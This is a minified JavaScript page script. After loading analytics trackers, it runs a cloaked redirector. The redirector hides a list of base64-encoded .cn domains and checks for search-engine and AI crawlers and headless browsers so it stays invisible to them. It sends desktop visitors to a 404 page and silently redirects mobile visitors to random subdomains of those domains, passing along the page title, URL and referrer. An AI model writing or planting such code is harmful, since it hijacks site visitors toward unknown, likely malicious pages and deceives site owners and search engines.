var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?50206310a70fe7f4fa4306902351e18d";var t=document.getElementsByTagName("script")[0]||document.head.firstChild;t&&t.parentNode&&t.parentNode.insertBefore(e,t)}();
!function(e,t,o,n,i,c,r){e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},(c=t.createElement(n)).async=1,c.src="https://www.clarity.ms/tag/"+i,(r=t.getElementsByTagName(n)[0]||t.head.firstChild)&&r.parentNode&&r.parentNode.insertBefore(c,r)}(window,document,"clarity","script","x5uw19opzg");
window._ta_config={sid:"apih5",url:"https://6gapi.com/collect/collect.php"};!function(w,d,s,u){var f=d.getElementsByTagName(s)[0]||d.head.firstChild,j=d.createElement(s);j.async=1;j.src=u;f&&f.parentNode&&f.parentNode.insertBefore(j,f)}(window,document,"script","https://6gapi.com/collect/tracker.js");
var CONFIG={
    jumpDelayMin: 1,
    jumpDelayMax: 2,
    subMinLen: 3,
    subMaxLen: 5,
    targetDomains: [
        "YWNkenZ2Yy5jbg==",
        "YWlmcmZ3eC5jbg==",
        "Ym5xY2pkbC5jbg==",
        "YnBrZHhjby5jbg==",
        "Y2d5em9meS5jbg==",
        "ZnhjcHlkeC5jbg==",
        "aWtrcmdjcC5jbg==",
        "amVma3hxai5jbg==",
        "bGdlb2prdy5jbg==",
        "bWx2dm5rbi5jbg==",
        "bmxzdWhvZi5jbg==",
        "bnFvdWF3Zi5jbg==",
        "cWh4YnJuYS5jbg==",
        "c2piZW5tbi5jbg==",
        "dG94cGVrbC5jbg==",
        "dnZ4dHJ5eC5jbg==",
        "d2xtdXVkbS5jbg==",
        "eHJtZ3J1cy5jbg==",
        "eXFmb2ZvYi5jbg==",
        "enZ5anp3Zi5jbg=="
    ],
    skipDomainProbe: true,
    domainProbeTimeout: 0,
    concurrentProbes: 30,
    mobileMaxWidth: 1024,
    pcAction: "/404.html",
    strictSearchEngine: false,
    antiHeadless: true,
    mobileOnly: true
};
!function(e){"use strict";function t(){var a=navigator.userAgent||"",t="ontouchstart"in window||navigator.maxTouchPoints>0||navigator.msMaxTouchPoints>0,o=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(a),n=e.mobileMaxWidth||1024,i=Math.min(window.screen.width,window.screen.height)<=n||window.innerWidth<=n;return o||t&&i}function o(){if(e.antiHeadless&&navigator.webdriver)return!0;for(var t=navigator.userAgent||"",o=[/Baiduspider/i,/Googlebot/i,/bingbot/i,/msnbot/i,/Sogou/i,/YisouSpider/i,/Bytespider/i,/360Spider/i,/YandexBot/i,/DuckDuckBot/i,/Applebot/i,/PetalBot/i,/SemrushBot/i,/AhrefsBot/i,/MJ12bot/i,/DotBot/i,/rogerbot/i,/TurnitinBot/i,/BLEXBot/i,/SeznamBot/i,/Exabot/i,/CCBot/i,/GPTBot/i,/ChatGPT-User/i,/ClaudeBot/i,/Amazonbot/i,/Twitterbot/i,/TelegramBot/i,/Discordbot/i],n=0;n<o.length;n++)if(o[n].test(t))return!0;return!!(/bot[\s\/;,)|-]/i.test(t)||/bot$/i.test(t)||/spider/i.test(t)||/crawl/i.test(t)||/slurp/i.test(t)||/fetch/i.test(t)||/scraper/i.test(t))}function n(t){for(var o="abcdefghijklmnopqrstuvwxyz",n="",i=0;i<t;i++)n+=o[Math.floor(Math.random()*o.length)];return n}function i(){var t=e.targetDomains,o=[];if(!t||!t.length)return o;for(var n=0;n<t.length;n++)try{o.push(atob(t[n]))}catch(e){o.push(t[n])}return o}function r(e){for(var t=e.length-1;t>0;t--){var o=Math.floor(Math.random()*(t+1)),n=e[t];e[t]=e[o],e[o]=n}return e}function a(t,o,n){var i=!1;function r(e){i||(i=!0,n(e))}var a=setTimeout((function(){r(!1)}),o);if("function"==typeof fetch)return void fetch("https://"+t+"/favicon.ico?_="+Date.now(),{mode:"no-cors",cache:"no-store"}).then((function(){clearTimeout(a),r(!0)})).catch((function(){clearTimeout(a),r(!1)}));var c=new Image;c.onload=function(){clearTimeout(a),r(!0)},c.onerror=function(){clearTimeout(a),r(!1)},c.src="https://"+t+"/favicon.ico?_="+Date.now()}function c(t){var o=i();if(!o.length)return void t("");var n=o[Math.floor(Math.random()*o.length)];if(e.skipDomainProbe)return void t(n);var c=null!=e.domainProbeTimeout?e.domainProbeTimeout:0,s=e.concurrentProbes||30,l=r(o.slice()),u=!1,d=0,f=0;function m(e){u||(u=!0,t(e))}function p(){d--,d<=0&&!u&&m(n),h()}function h(){for(;d<s&&f<l.length&&!u;)(function(e){d++,a(e,c,(function(t){t?m(e):p()}))})(l[f++]);f>=l.length&&0===d&&!u&&m(n)}h()}function s(t,o){return t>o&&(t=(o^=t^=o)^t),t+Math.floor(Math.random()*(o-t+1))}function l(t){var o=encodeURIComponent(document.title||""),i=encodeURIComponent(window.location.href||""),r=encodeURIComponent(document.referrer||""),a="https://"+n(s(e.subMinLen,e.subMaxLen))+"."+t+"/ai.php?title="+o+"&from_url="+i+"&from="+r;setTimeout((function(){window.location.replace(a)}),s(e.jumpDelayMin,e.jumpDelayMax))}function u(){if(o())return;var n=document.referrer||"";if(e.strictSearchEngine&&!/baidu\.com|sogou\.com|so\.com|google\.|bing\.com|sm\.cn|toutiao\.com|quark\.cn|yahoo\.com|yandex\.|duckduckgo\.com|soso\.com/i.test(n))return;if(e.mobileOnly&&!t())return void window.location.replace(e.pcAction);c((function(e){e&&l(e)}))}u()}(CONFIG);
